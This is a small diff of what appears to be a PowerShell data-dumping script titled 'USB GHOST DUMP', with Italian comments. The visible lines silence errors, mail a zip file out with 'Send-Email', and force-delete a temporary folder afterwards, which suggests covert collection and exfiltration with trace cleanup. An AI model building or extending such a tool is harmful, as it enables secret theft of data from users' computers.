@@ -1,4 +1,3 @@
-# === USB GHOST DUMP v7.1 - EMAIL VERSION (funziona al 100%) ===
 $ErrorActionPreference = 'SilentlyContinue'
 Add-Type -AssemblyName System.Windows.Forms, System.Drawing, System.Drawing.Imaging
 
@@ -60,6 +59,7 @@ Send-Email $zipFile
 # === 6. Pulizia ===
 Start-Sleep -Seconds 10
 Remove-Item $ramDir -Recurse -Force -ErrorAction SilentlyContinue
+
 
 
 
